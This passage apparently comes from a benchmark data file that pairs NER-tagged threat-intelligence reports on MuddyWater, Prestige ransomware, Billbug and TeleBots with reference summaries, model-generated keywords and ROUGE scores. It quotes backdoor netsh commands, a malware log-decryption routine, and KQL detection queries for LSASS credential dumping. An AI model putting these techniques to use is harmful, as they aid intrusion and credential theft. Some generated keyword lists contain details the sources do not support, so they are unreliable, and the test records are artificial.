MuddyWater uses direct IP addresses and a few domain names for command and control. Compromised WordPress sites have been used as proxies. Targets are mostly government entities in the Middle East and Asia, especially in finance, education, foreign affairs, defense, and telecom sectors. While MuddyWater does not seem to have access to zero-days, they have still compromised many targets through continuously evolving infection vectors, especially via email. Organizations should use strong email security and educate employees on email threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4404145077720207, "gpt3/lexical/rouge_rouge2": 0.13541666666666666, "gpt3/lexical/rouge_rougeL": 0.23316062176165805, "gpt3/lexical/rouge_rougeLsum": 0.23316062176165805, "gpt3_generated_text": ["In a recent report, new campaigns attributed to the threat actor group MuddyWater have been discovered, revealing their continued efforts in targeting organizations in Middle Eastern and Asian countries. The group has been observed using new tools and payloads in their campaigns over the first half of 2019, including the deployment of a multi-stage PowerShell-based backdoor known as POWERSTATS v3. The group has been sending spear-phishing emails to organizations in Jordan and the Turkish government, using compromised legitimate accounts to trick users into installing malware. The backdoor code collects operating system information and uploads it to a command and control (C&C) server, allowing the attackers to initiate a second stage attack by downloading and installing another backdoor payload. The group has also been observed using different payloads and tools in their campaigns since 2018. These findings shed light on the group's infrastructure, target countries, and industries, providing crucial insights into their old and recent activities."]}, {"split_name": "test", "sample_id": "test_80", "prompt_text": "Extract the keywords: www.microsoft.com /en - us / security / blog/2022/10/14 / new - prestige - ransomware - impacts - organizations - in - ukraine - and - poland/ New \u201c Prestige \u201d ransomware impacts organizations in [GPE] Ukraine and [GPE] Poland \u22ee [DATE] 10/14/2022November 10 , [DATE] 2022 update : [ORG] MSTIC has updated this blog to document assessed attribution of DEV- [DATE] 0960 as [ORG] IRIDIUM , the actor that executed the [PERSON] Prestige ransomware - style attacks . [ORG] The [ORG] Microsoft [ORG] Threat [ORG] Intelligence [ORG] Center ( MSTIC ) has identified evidence of a novel ransomware campaign targeting organizations in the transportation and related logistics industries in [GPE] Ukraine and [GPE] Poland utilizing a previously unidentified ransomware payload . We observed this new ransomware , which labels itself in its ransom note as \u201c Prestige ranusomeware \u201d , being deployed on [DATE] October [DATE] 11 in attacks occurring within [TIME] an [TIME] hour of each other across all victims . Attribution to [GPE] IRIDIUMAs of [DATE] November [DATE] 2022 , [ORG] MSTIC assesses that [ORG] IRIDIUM very likely executed the [PERSON] Prestige ransomware - style attack . [ORG] IRIDIUM is a [GPE] Russia - based threat actor tracked by [ORG] Microsoft , publicly overlapping with [ORG] Sandworm , that has been consistently active in the war in [GPE] Ukraine and has been linked to destructive attacks since the start of the war . This attribution assessment is based on forensic artifacts , as well as overlaps in victimology , tradecraft , capabilities , and infrastructure , with known [ORG] IRIDIUM activity . Review of technical artifacts available to [ORG] Microsoft links [ORG] IRIDIUM to interactive compromise activity at multiple [PERSON] Prestige victims as far back as [DATE] March [DATE] 2022 and continuing within [DATE] the [DATE] week leading up to the [DATE] October [DATE] 2022 attack discussed in the blog below . The [PERSON] Prestige campaign may highlight a measured shift in [ORG] IRIDIUM \u2019s destructive attack calculus , signaling increased risk to organizations directly supplying or transporting humanitarian or military assistance to [GPE] Ukraine . More broadly , it may represent an increased risk to organizations in [LOC] Eastern [LOC] Europe that may be considered by the [NORP] Russian state to be providing support relating to the war.1/7Microsoft would like to acknowledge [ORG] CERT [ORG] UA for their cooperation and information sharing to assist in our investigations . [ORG] CERT [ORG] UA continues to demonstrate incredible resolve and commitment to security despite physical danger . Observed actor activityThis ransomware campaign had several notable features that differentiate it from other [ORG] Microsoft - tracked ransomware campaigns : The enterprise - wide deployment of ransomware is not common in [GPE] Ukraine , and this activity was not connected to any of the [CARDINAL] 94 currently active ransomware activity groups that [ORG] Microsoft tracks The [PERSON] Prestige ransomware had not been observed by [ORG] Microsoft prior to this deployment The activity shares victimology with recent [NORP] Russian state - aligned activity , specifically on affected geographies and countries , and overlaps with previous victims of the [ORG] FoxBlade malware ( also known as HermeticWiper)Despite using similar deployment techniques , the campaign is distinct from recent destructive attacks leveraging [ORG] AprilAxe ( [ORG] ArguePatch)/CaddyWiper [ORG] or [ORG] Foxblade ( [ORG] HermeticWiper ) that have impacted multiple critical infrastructure organizations in [GPE] Ukraine over [DATE] the [DATE] last [DATE] two [DATE] weeks . [ORG] MSTIC has not yet linked this ransomware campaign to a known threat group and is continuing investigations . [ORG] MSTIC is tracking this activity as IRIDIUM.This blog aims to provide awareness and indicators of compromise ( IOCs ) to [ORG] Microsoft customers and the larger security community . [ORG] Microsoft continues to monitor this and is in the process of early notification to customers impacted by [ORG] IRIDIUM but not yet ransomed . [ORG] MSTIC is also actively working with the broader security community and other strategic partners to share information that can help address this evolving threat through multiple channels . Pre - ransomware activitiesPrior to deploying ransomware , the [ORG] IRIDIUM activity included the use of the following [CARDINAL] two remote execution utilities : [ORG] RemoteExec \u2013 a commercially available tool for agentless remote code execution Impacket WMIexec \u2013 an open - source script - based solution for remote code executionTo gain access to highly privileged credentials , in some of the environments , [ORG] IRIDIUM used these tools for privilege escalation and credential extraction : winPEAS \u2013 an open - source collection of scripts to perform privilege escalation on Windows comsvcs.dll \u2013 used to dump the memory of the LSASS process and steal credentials ntdsutil.exe \u2013 used to back up the Active Directory database , likely for later use credentialsRansomware deploymentIn all observed deployments , the attacker had already gained access to highly privileged credentials , like [PERSON] Domain [PERSON] Admin , to facilitate the ransomware deployment . Initial access vector has not been identified at this time , but in some instances it \u2019s possible that the attacker might have already had existing access to the highly privileged credentials from a prior compromise . In these instances , the attack timeline starts with the attacker already having Domain Admin - level access and staging their ransomware payload . Most ransomware operators develop a preferred set of tradecraft for their payload deployment and execution , and this tradecraft tends to be consistent across victims , unless a security configuration prevents their preferred method . For this [ORG] IRIDIUM activity , the methods used to deploy the ransomware varied across the victim environments , but it does not appear to be due to security configurations preventing the attacker from using the same techniques . This is especially notable as the ransomware deployments all occurred within [TIME] one [TIME] hour . The distinct methods for ransomware deployment were : Method [CARDINAL] 1 : The ransomware payload is copied to the [ORG] ADMIN$ share of a remote system , and [ORG] Impacket is used to remotely create a Windows Scheduled Task on target systems to execute the payload2/7Method [CARDINAL] 2 : The ransomware payload is copied to the [ORG] ADMIN$ share of a remote system , and [ORG] Impacket is used to remotely invoke an encoded [ORG] PowerShell command on target systems to execute the payloadMethod [CARDINAL] 3 : The ransomware payload is copied to an Active Directory Domain [PERSON] Controller and deployed to systems using [ORG] the [ORG] Default [ORG] Domain [ORG] Group [ORG] Policy [ORG] ObjectMalware analysis3/7The \u201c [WORK_OF_ART] Prestige \u201d ransomware requires administrative privileges to run . Like many ransomware payloads , it attempts to stop the MSSQL Windows service to ensure successful encryption using the following command ( the strings \u201c C:\\Windows\\System32\\net.exe stop \u201d and \u201c MSSQLSERVER \u201d are both hardcoded in the analyzed samples):Prestige creates C:\\Users\\Public\\README and stores the following ransom note in the file . The same file is also created in the root directory of each drive : Prestige ransom notePrestige then traverses the files on the file system and encrypts the contents of files that have [CARDINAL] one of the following hardcoded file extensions , avoiding encrypting files in the C:\\Windows\\ and [GPE] C:\\ProgramData\\Microsoft\\ directories : After encrypting each file , the ransomware appends the extension .enc to the existing extension of the file . For example , [GPE] changes.txt is encrypted and then renamed to changes.txt.enc . Prestige uses the following [CARDINAL] two commands to register a custom file extension handler for files with .enc file extension : Custom file extension handler for files with .enc extensionAs a result of creating the custom file extension handler , when any file carrying the file extension .enc ( i.e. , encrypted by [PERSON] Prestige ) is opened by a user , the file extension handler uses [PERSON] Notepad to open C:\\Users\\Public\\README , which contains the ransom note.4/7To encrypt files , [PERSON] Prestige leverages the CryptoPP [LANGUAGE] C++ library to AES - encrypt each eligible file . During the encryption process , the following hardcoded RSA X509 public key is used by [CARDINAL] one version of the ransomware ( each version of [PERSON] Prestige may carry a unique public key):To hinder system and file recovery , [PERSON] Prestige runs the following command to delete the backup catalog from the system : [PERSON] Prestige also runs the following command to delete all volume shadow copies on the system : Before running the commands above , the [CARDINAL] 32 - bit version of [PERSON] Prestige calls the function Wow64DisableWow64FsRedirection ( ) to disable file system redirection and gain access to the native System32 directory . After running the commands above , [ORG] Prestige restores file system redirection by calling the function Wow64RevertWow64FsRedirection().Microsoft will continue to monitor [ORG] IRIDIUM activity and implement protections for our customers . The current detections , advanced detections , and IOCs in place across our security products are detailed below . Looking forwardThe threat landscape in [GPE] Ukraine continues to evolve , and wipers and destructive attacks have been a consistent theme . Ransomware and wiper attacks rely on many of the same security weaknesses to succeed . As the situation evolves , organizations can adopt the hardening guidance below to help build more robust defenses against these threats . Recommended customer actionsThe ransomware payload was deployed by the actor after an initial compromise that involved gaining access to highly privileged credentials . The techniques used by the actor and described in the \u201c [WORK_OF_ART] Observed [WORK_OF_ART] Actor [WORK_OF_ART] Activity \u201d section can be mitigated by adopting the security considerations provided below : Block process creations originating from [ORG] PSExec and [ORG] WMI commands to stop lateral movement utilizing the [ORG] WMIexec component of [ORG] Impacket . Enable Tamper protection to prevent attacks from stopping or interfering with [PERSON] Microsoft [PERSON] Defender . Turn on cloud - delivered protection in [LOC] Microsoft [LOC] Defender [LOC] Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques . Cloud - based machine learning protections block a huge majority of new and unknown variants . While this attack differs from traditional ransomware , following our defending against ransomware guidance helps protect against the credential theft , lateral movement , and ransomware deployment used by [ORG] IRIDIUM . Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion.5/7Enable multifactor authentication ( [ORG] MFA ) to mitigate potentially compromised credentials and ensure that [ORG] MFA is enforced for all remote connectivity , including VPNs . [ORG] Microsoft strongly encourages all customers download and use password - less solutions like [ORG] Microsoft [ORG] Authenticator to secure your accounts . Indicators of compromise ( IOCs)The following table lists the IOCs observed during our investigation . We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems . [ORG] Indicator [ORG] File path of the ransom noteNOTE : These indicators should not be considered exhaustive for this observed activity . [ORG] Microsoft 365 [PRODUCT] DefenderMicrosoft [PRODUCT] Defender [PRODUCT] AntivirusMicrosoft [PRODUCT] Defender [PRODUCT] Antivirus detects known [PERSON] Prestige ransomware payloads with the following detection : Ransom : Win32 / [ORG] PrestigeMicrosoft [ORG] Defender for [WORK_OF_ART] EndpointMicrosoft [WORK_OF_ART] Defender [WORK_OF_ART] for [WORK_OF_ART] Endpoint provides alerts for the indicators used by [ORG] IRIDIUM discussed above . Ransomware - linked emerging threat activity group [ORG] IRIDIUM detectedMicrosoft [PERSON] Defender [PERSON] for [ORG] Endpoint also provides alerts for the pre - ransom techniques discussed above . Customers should act on these alerts as they indicate hands - on - keyboard attacks . NOTE : These alerts are not uniquely tied to the [PERSON] Prestige ransomware nor to the campaign discussed . Ongoing hands - on - keyboard attack via Impacket toolkit [PERSON] WinPEAS tool detected Sensitive credential memory read [PERSON] Password hashes dumped from LSASS memory [ORG] Suspicious scheduled task activity System recovery setting tampering File backups were deletedAdvanced hunting queries6/7Microsoft [PRODUCT] SentinelPrestige ransomware file hashesThis query looks for file hashes and [ORG] Microsoft [ORG] Defender [ORG] Antivirus detections associated with [ORG] Prestige ransomware payload.url Sentinel / tree / master / Detections / MultipleDataSources / PrestigeRansomwareIOCsOct22.yamlMicrosoft [CARDINAL] 365 [ORG] DefenderImpacket [ORG] WMIexec usageThis query surfaces [ORG] Impacket [ORG] WMIexec usage on a device : DeviceProcessEvents | where Timestamp > = ago(7d ) | where [ORG] FileName = ~ \" cmd.exe \" | where InitiatingProcessFileName = ~ \" WmiPrvSE.exe\"This query has the same purpose as above , but it also groups all the commands launched using [ORG] Impacket [ORG] WMIexec on the device : DeviceProcessEvents | where Timestamp > = ago(7d ) | where [ORG] FileName = ~ \" cmd.exe \" | where InitiatingProcessFileName = ~ \" WmiPrvSE.exe \" | project [ORG] DeviceName , [ORG] DeviceId , [ORG] Timestamp , ProcessCommandLine | summarize [ORG] make_set(ProcessCommandLine ) , min(Timestamp ) , max(Timestamp ) by [ORG] DeviceId , DeviceNameLSASS process memory dumpingThis query surfaces attempts to dump the LSASS process memory comsvcs.dll : let startTime = ago(7d ) ; let endTime = now ( ) ; DeviceProcessEvents | where Timestamp between ( startTime endTime ) | where [ORG] FileName = ~ ' rundll32.exe ' and [DATE] ProcessCommandLine has ' comsvcs.dll ' and [DATE] ProcessCommandLine has_any ( ' full','MiniDump ' ) | where not ( [CARDINAL] ProcessCommandLine matches regex @'{[\\w\\d]{8}-[\\w\\d]{4}-[\\w\\d]{4}-[\\w\\d ] { [CARDINAL] 4}-[\\w\\d]{12 } } ' and [CARDINAL] ProcessCommandLine matches regex @'(\\d{2}_){3 } ' ) [CARDINAL] 7/7", "generated_text": "Microsoft Threat Intelligence Center; MSTIC; a novel ransomware campaign; organizations; transportation; logistics; Ukraine; Poland; October 11; the ransom note; IRIDIUM; a Russia-based threat actor; Sandworm; the war; over a decade; the campaign; Victimology; October 2022; Russia; FoxBlade; HermeticWiper; FoxBlade; HermeticWiper victims; March 2022; the threat actor; Threat Intelligence Center; the threat actor; vulnerabilities; a reasonable probability; the Prestige ransomware; risk; Western Europe; the war; CERT UA; CERT UA; cooperation; information sharing; this evolving threat.", "ref_text": "<START-1>The Microsoft Threat Intelligence Center (MSTIC) has identified a new ransomware campaign called \"Prestige\" targeting organizations in the transportation and logistics industries in Ukraine and Poland. The ransomware was deployed on October 11 against multiple victims within an hour. MSTIC now attributes these attacks to the Russia-based threat actor IRIDIUM, which overlaps with Sandworm. This attribution is based on forensic artifacts linking IRIDIUM to interactive compromise of Prestige victims as early as March 2022. The Prestige attacks display some differences from other recent destructive attacks in Ukraine like FoxBlade/HermeticWiper and AprilAxe/CaddyWiper. However, it shares victimology with Russian state-aligned activity. Prior to deploying ransomware, IRIDIUM used remote execution tools like RemoteExec and Impacket for privilege escalation and credential theft. To deploy ransomware, IRIDIUM copied payloads to admin shares or domain controllers and executed via scheduled tasks, WMI, or group policy. Analysis of the Prestige ransomware shows it encrypts files with certain extensions and appends .enc, using Crypto++ library. It deletes backups and shadow copies, disables SQL Server, and drops a ransom note. Microsoft provides IOCs, detections, and security recommendations like enabling MFA, tamper protection, and investigating IOCs. Customers should harden defenses against ransomware, credential theft, and lateral movement techniques. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5024875621890548, "gpt3/lexical/rouge_rouge2": 0.24, "gpt3/lexical/rouge_rougeL": 0.3283582089552239, "gpt3/lexical/rouge_rougeLsum": 0.3283582089552239, "gpt3_generated_text": ["The Microsoft Threat Intelligence Center (MSTIC) has identified a new ransomware campaign called \"Prestige\" that is targeting organizations in the transportation and logistics industries in Ukraine and Poland. The ransomware, attributed to the threat actor IRIDIUM, was deployed on October 11 and is believed to be part of a shift in IRIDIUM's destructive attack strategy. This campaign poses an increased risk to organizations supplying or transporting humanitarian or military assistance to Ukraine, as well as those in Eastern Europe that may be seen as supporting the war. The campaign shares victimology with recent Russian state-aligned activity and overlaps with previous victims of the FoxBlade malware. MSTIC is actively investigating this campaign and is working with the security community to address the threat. Prior to deploying the ransomware, IRIDIUM used remote execution utilities and privilege escalation techniques to gain access to highly privileged credentials. The initial access vector has not been identified, but in some instances, the attacker may have had pre-existing access to the credentials. This article provides awareness and indicators of compromise to help organizations protect themselves against this evolving threat. MSTIC is also notifying impacted customers and collaborating with strategic partners to address the issue."]}, {"split_name": "test", "sample_id": "test_81", "prompt_text": "Extract the keywords: symantec-enterprise-blogs.security.com /blogs / threat - intelligence / espionage - asia - governments - cert - authority Billbug : State - sponsored [ORG] Actor [ORG] Targets [ORG] Cert [ORG] Authority , Government Agencies in Multiple Asian CountriesState - sponsored actors compromised a digital certificate authority in an [NORP] Asian country during a campaign in which multiple government agencies were also targeted . Symantec , by [ORG] Broadcom [ORG] Software , was able to link this activity to a group we track as Billbug due to the use in this campaign of tools previously attributed to this group . Billbug ( aka [PERSON] Lotus [PERSON] Blossom , [ORG] Thrip ) is a long - established advanced persistent threat ( [ORG] APT ) group that is believed to have been active since [DATE] at [DATE] least [DATE] 2009 . Symantec has previously published on this group \u2019s activity in [DATE] 2018 and [DATE] 2019 under the [ORG] Thrip name , but following our [DATE] 2019 investigation , we determined that [ORG] Thrip and Billbug were most likely the same group so now track all activity under the [PERSON] Billbug name . In activity documented by [NORP] Symantec in [DATE] 2019 , we detailed how the group was using a backdoor known as [ORG] Hannotog ( Backdoor . Hannotog ) and another backdoor known as [NORP] Sagerunex ( Backdoor . Sagerunex ) . Both these tools were also seen in this more recent activity . The victims in this campaign included a certificate authority , as well as government and defense agencies . All the victims were based in various countries in [LOC] Asia . [PERSON] Billbug is known to focus on targets in [NORP] Asian countries . In [CARDINAL] at [CARDINAL] least [CARDINAL] one of the government victims , a large number of machines on the network were compromised by the attackers . The targeting of a certificate authority is notable , as if the attackers were able to successfully compromise it to access certificates they could potentially use them to sign malware with a valid certificate , and help it avoid detection on victim machines . It could also potentially use compromised certificates to intercept HTTPS traffic . However , although this is a possible motivation for targeting a certificate authority , [ORG] Symantec has seen no evidence to suggest they were successful in compromising digital certificates . Symantec has notified the cert authority in question to inform them of this activity . This activity has been ongoing since [DATE] at [DATE] least [DATE] March [DATE] 2022 . Attack [CARDINAL] chainThere are some indications that the attackers are exploiting public - facing applications to gain initial access to victim networks . The attackers use multiple dual - use tools in this attack campaign , as well as custom malware . [ORG] Billbug \u2019s extensive use of dual - use and living - off - the - land tools was also notable in its previous campaigns . Among the dual - use tools1/5leveraged in this recent activity are : AdFind \u2013 A publicly available tool that is used to query [WORK_OF_ART] Active [WORK_OF_ART] Directory . It has legitimate uses but is widely used by attackers to help map a network . [PERSON] Winmail [PERSON] \u2013 [PERSON] Can open winmail.dat files . WinRAR \u2013 An archive manager that can be used to archive or zip files - for example , prior to exfiltration . Ping \u2013 A tool that is freely available online that can allow users to determine if a specific location on a network is responding . [ORG] Tracert \u2013 A network tool that can be used to determine the \u201c path \u201d packets take from [CARDINAL] one [ORG] IP address to another . It provides the hostname , IP address , and the response time to a ping . Route \u2013 A path for sending packets through the internet network to an address on another network . [ORG] NBTscan \u2013 Open - source command - line [NORP] NetBIOS scanner . Certutil \u2013 [ORG] Microsoft [PRODUCT] Windows utility that can be used for various malicious purposes , such as to decode information , to download files , and to install browser root certificates . [PERSON] Port [PERSON] Scanner \u2013 Allows an attacker to determine what ports are open on a network and could potentially be used to send and receive data . Multiple files that are believed to be loaders for the [ORG] Hannotog backdoor were spotted on victim machines . A backdoor was then deployed on the compromised system . This backdoor has multiple functionalities : It executes netsh to update the firewall settings : netsh advfirewall firewall add rule [ORG] name=\"Core [ORG] Networking [ORG] - [ORG] Router [ORG] Solicitation ( ICMP - In ) \" dir = in action = allow program=\"%s \" enable = yes netsh firewall add portopening [ORG] UDP [ORG] 5900 [ORG] @xpsp2res.dll,-22006 [ORG] ENABLE [ORG] ALL',0 netsh firewall add allowedprogram [ORG] name=\"SNMP [ORG] Trap [ORG] Service \" program=\"%s \" mode = enableListens on port 5900 Can create a service for persistence Can also stop services Can upload encrypted data Can execute cmd.exe /c % s command to gather system information Can download files to the machineA tool called Stowaway Proxy Tool was also downloaded to victim machines . [ORG] Stowaway is a multi - level proxy tool written in the Go language and intended for use by penetration testers . Users can use this program to proxy external traffic to the intranet through multiple nodes , break through intranet access restrictions , construct a tree - like node network , and easily implement management functions . It is not unusual to see penetration testing tools misused by threat actors . [PERSON] Cobalt [PERSON] Strike , which is a penetration testing framework , is considered commodity malware by many due to how often it is used by malicious actors . [ORG] Sagerunex [ORG] - [ORG] Technical [ORG] detailsThe [ORG] Sagerunex backdoor is fairly resilient and implements multiple forms of communication with its command - and- control ( [ORG] C&C ) server . The analyzed sample had no hardcoded configuration , so it had to be dropped on the machine by a loader malware , such as [ORG] Hannotog . In the sample analyzed by [ORG] Symantec , configuration is passed to the sample via a parameter of the exported function ( called MainEntry ) . That configuration is decrypted with a simple XOR operation : def simplecrypt(x):return xor(x , b\"\\xad \" + x[:-1])Next , the sample finds the explorer.exe process and uses it to change the token of the current thread . It then writes logs to a temporary file ( % TEMP%/TS_FB56.tmp ) , but only if the file already exists . These logs are encrypted and the encryption algorithm used is AES256 - CBC with [CARDINAL] 8192 rounds of SHA256 : def decrypt(datasample):key = b'\\x53\\x12\\x76\\x23\\x94\\x89\\x78\\x45\\x58\\x31\\x62\\x83\\x77\\x95\\x59\\x17\\x31\\x47\\x73\\x50\\x22\\x34\\x65\\x89\\x49\\x12\\x67\\x41\\x90\\x352/5realkey = datasample[:0x10]+ b'\\x00 ' * 0x10for i in range(0x2000 ): realkey = hashlib.sha256(realkey + key).digest()raw = aes.cbc.decrypt(realkey , datasample[:16 ] , datasample[16:])print(\"checksum \" , [ORG] raw[-32:].hex ( ) ) return raw[:-32]The encryption key is hardcoded , and was previously used in an older sample of this malware . The same encryption algorithm is used for network communication . The encrypted data structure is as follows : struct encrypted_data { byte[16 ] IV ; byte[N ] message_data ; // always divisible by [CARDINAL] 16 , padding added as necessary byte[32 ] sha256_checksum ; } The sample stores configuration and state in the following file:%appdata%/microsoft / protect / windows / DMI%X.DAT ( where % X is variable and depends on the parameter with which sample was started).It is also encrypted , but with RC4 . This key was hardcoded in older versions of [ORG] Sagerunex , but recent samples started to read the key from configuration instead . The config file modification date will always be in [DATE] the [DATE] year [DATE] 2011 \u2013 the \u201c file last edit [DATE] \u201d [DATE] year is changed by the malware to 2011.Network communicationIn normal mode , the sample will try all the following supported connection modes in this order . In all cases , [ORG] HTTPS is used , with user agent equal to : Mozilla/5.0 ( compatible ; [ORG] MSIE [CARDINAL] 7.0 ; Win32).- 1 : httpsviaconfigproxy : HTTPS with configured proxy- [CARDINAL] 2 : httpswpadproxy : instead of using configured proxy , use proxy provided by [GPE] WPAD mechanism ( web proxy autodiscovery)- [CARDINAL] 3 : httpsviaiexproxy : self - explanatory . Use proxy from \\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ProxyServer- 4 : httpsviafirefoxproxy - get proxy from \\\\Mozilla\\\\Firefox\\\\profiles.ini ( [CARDINAL] one of [ORG] FF config files)- [CARDINAL] 5 : httpsviaautoproxy - use proxy obtained from WinHttpGetIEProxyConfigForCurrentUser- [CARDINAL] 6 : httpspreconfig - try to connect without proxyThe network packet is composed of [CARDINAL] two parts : the header and the payload . Both are encrypted separately.struct network_packet { byte[64 ] encrypted_header ; // see encrypted_data above byte[N ] encrypted_payload ; // see encrypted_data above } The structure of the decrypted header is as follows : struct header { } The structure of the decrypted payload mostly depends on the command ID . The list of supported commands includes:3/57 : Return the list of currently configured proxies . [CARDINAL] 9 : Execute a program , [ORG] DLL or shell command . There are [CARDINAL] three supported subcommands : \" runexe \" to run an executable , \" rundll \" to run a [ORG] DLL file , and anything else for arbitrary shell command . [CARDINAL] 11 : Steal a local file ( gets a file name specified in the command payload ) . [CARDINAL] 15 : Get a configured file path ( configured by command [CARDINAL] 18 ) . [CARDINAL] 17 : Drop a file to a specified path \u2013 but only if the specified path was previously selected by command [CARDINAL] 18 . [CARDINAL] 18 : Select a file path for commands [CARDINAL] 15 and 17.MotivationWhile we do not see data being exfiltrated in this campaign , [PERSON] Billbug is widely regarded as being an espionage actor , indicating that data theft is the most likely motivation in this campaign . The victims in this campaign \u2013 government agencies and a certificate authority \u2013 also point to an espionage and data - theft motive . The targeting of the government victims is most likely driven by espionage motivations , with the certificate authority likely targeted in order to steal legitimate digital certificates , as mentioned in the introduction . This is potentially very dangerous , as if [PERSON] Billbug is able to sign its malware with a valid digital certificate it may be able to bypass security detections on victim machines . The ability of this actor to compromise multiple victims at once indicates that this threat group remains a skilled and well - resourced operator that is capable of carrying out sustained and wide - ranging campaigns . [PERSON] Billbug also appears to be undeterred by the possibility of having this activity attributed to it , with it reusing tools that have been linked to the group in the past . [ORG] ProtectionFor the latest protection updates , please visit [ORG] the [ORG] Symantec [ORG] Protection [ORG] Bulletin .", "generated_text": "APT; Billbug; Lotus Blossom; Thrip; the group; at least 2009; organizations; Asia; a certificate authority; government; defense agencies; the attackers; dual-use tools; AdFind; Hannotog; Sagerunex; reconnaissance; a backdoor; Hannotog; the group; detection; infrastructure; 50; a hostname; IP; IP addresses; port scanner; Certutil; NetBIOS; Port Scanner; Port Scanner; custom malware; the campaign; March 2022; the certificate authority; Chinese; a suite; Advanced Persistent Threat; at least March 2022.", "ref_text": "<START-1>The cybersecurity company Symantec has uncovered a hacking campaign by a state-sponsored group called Billbug that targeted multiple government agencies and a certificate authority in several Asian countries. Billbug is believed to have been active since at least 2009 and focuses on targets in Asia. In 2019 and 2020, Symantec tracked this group's activity under the name Thrip, but after further investigation, it was determined that Thrip and Billbug were likely the same group. The attackers gained initial access by exploiting vulnerabilities in public-facing applications. They then used publicly available dual-use tools like AdFind, WinRAR, and Certutil along with custom malware like the Hannotog and Sagerunex backdoors to compromise victim networks. The backdoors gave the hackers remote access, command execution, and data exfiltration capabilities. While no data theft was observed, espionage is believed to be the motivation given Billbug's history and the nature of the victims. The certificate authority was likely hacked to gain the ability to sign malware with valid certificates to avoid detection. However, there is no evidence this was achieved. Billbug's reuse of known tools and targeting of multiple victims simultaneously demonstrates this is a sophisticated, persistent threat actor that remains undeterred. The campaign has been ongoing since at least March 2022. Protection methods and indicators of compromise are provided. Overall, the report exposes an active espionage operation by a capable state-sponsored group in Asia. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5673076923076923, "gpt3/lexical/rouge_rouge2": 0.21256038647342992, "gpt3/lexical/rouge_rougeL": 0.24999999999999994, "gpt3/lexical/rouge_rougeLsum": 0.24999999999999994, "gpt3_generated_text": ["State-sponsored actors, identified as the APT group Billbug (also known as Lotus Blossom and Thrip), have targeted a certificate authority and multiple government and defense agencies in Asian countries. The campaign, which has been ongoing since at least March 2022, was discovered by Symantec, now owned by Broadcom Software. The group has been active since at least 2009 and has previously been tracked under the name Thrip. The attackers used tools previously attributed to the group, including the backdoors Hannotog and Sagerunex. While the targeting of the certificate authority raises concerns about the potential misuse of digital certificates, there is no evidence to suggest that the attackers were successful in compromising them. The attackers appear to have gained initial access to victim networks by exploiting public-facing applications. They utilized a range of dual-use and living-off-the-land tools, such as AdFind, Winmail, WinRAR, Ping, Tracert, Route, NBTscan, Certutil, and Port Scanner. The attackers also deployed a backdoor and downloaded a tool called Stowaway Proxy Tool on victim machines. Symantec has notified the certificate authority about the activity."]}, {"split_name": "test", "sample_id": "test_82", "prompt_text": "Extract the keywords: Language : [ORG] EnglishOur website uses cookies . By continuing to browse the site you are agreeing to our use of cookies . For more details aboutcookies and how to manage them , see our Cookie PolicyType your keyword [ORG] SearchThe rise of [ORG] TeleBots : Analyzing disruptive 06:00PMMALWAREIn the second half of 2016 , ESET researchers identi\ufb01ed a unique malicious toolset that was used in targeted   cyberattacks against high - value targets in the [NORP] Ukrainian \ufb01nancial sector . We believe that the main goal of   attackers using these tools is cybersabotage . This blog post outlines the details about the campaign that we discovered . We will refer to the gang behind the malware as [ORG] TeleBots . However it \u2019s important to say that these attackers , and the toolset used , share a number of similarities with the [ORG] BlackEnergy group , which conducted attacks against the energy industry in [GPE] Ukraine in [DATE] December [DATE] 2015 and [DATE] January [DATE] 2016 . In fact , we think that the [ORG] BlackEnergy group has evolved into the [ORG] TeleBots group . Infection vectorAs with campaigns attributed to [ORG] BlackEnergy group the attackers used spearphishing emails with [ORG] Microsoft [ORG] Excel documents attached that contain malicious macros as an initial infection vector . This time malicious documents do n\u2019t have any content with social engineering directing potential victims to click an Enable Content button . It seems that the attackers are depending on the victims to decide entirely on their own whether to click it or not . Figure [CARDINAL] 1 : [CARDINAL] One example of a malicious XLS document used in the spearphishing attack . Usually , the malicious documents do n\u2019t contain meaningful information in the metadata , but this time the metadata of the document contains the nickname of the person who is responsible for its modi\ufb01cation .   Moreover , this nickname matches that of an individual who is actively communicating within a Russian- speaking community of cybercriminals . However , we should say that it is possible that this was intended deceptively as a false \ufb02ag or a coincidence . Figure [CARDINAL] 2 : Metadata reveals what might be theattacker \u2019s nickname . Once a victim clicks on the Enable Content button , [PRODUCT] Excel executes the malicious macro . Our analysis shows that the code of the macro used in TeleBots documents matches the macro code that was used by the [ORG] BlackEnergy group in [DATE] 2015 . Figure [CARDINAL] 3 illustrates these similarities . The main purpose of the macro is to drop a malicious binary using the explorer.exe \ufb01lename and then   to execute it . The dropped binary belongs to a trojan downloader family , its main purpose being to download and execute another piece of malware . This trojan downloader is written in the Rust programming language . It should be noted that during the \ufb01rst stages of the attack , the [ORG] TeleBots group abuse various legitimate   servers in order to hide malicious activity in the network . For example , the trojan downloader fetches data from a hardcoded URL that points to a text \ufb01le on the putdrive.com service ( which allows anyone to upload   and share \ufb01les online ) . The text \ufb01le that is hosted on the online service is a \ufb01nal payload , encoded using     the Base64 algorithm . The \ufb01nal payload is a backdoor written in Python and detected as the   Python / TeleBot . AA trojan . This backdoor is the main piece of malware used by these attackers , which is why we \u2019ve named the [ORG] TeleBots group as such . Figure [CARDINAL] 3 : Similarities between malicious macro code used by [ORG] BlackEnergy and [ORG] TeleBots . Python / TeleBot . AA backdoorIn [DATE] January [DATE] 2016 we published our analysis of a spearphishing attack against energy companies in [GPE] Ukraine . That attack probably has a connection to the infamous [ORG] BlackEnergy attacks in [DATE] 2015 because the attackers used exactly the same mail server to send spearphishing messages . However , the attacks in [DATE] January [DATE] 2016 were di\ufb00erent . Instead of using the [PRODUCT] BlackEnergy malware family , the attackers used a relatively simple   open - source backdoor , written in the Python programming language , called GCat . The Python code of the GCat backdoor was obfuscated , then converted into a stand - alone executable using the [PERSON] PyInstaller program . The Python / TeleBot malware uses exactly the same approach ; the Python backdoor code is obfuscated and packed into a standalone executable using [PERSON] PyInstaller . In addition , the Python code is ROT13 encoded , [ORG] AES encrypted , compressed using zlib library and then [PERSON] 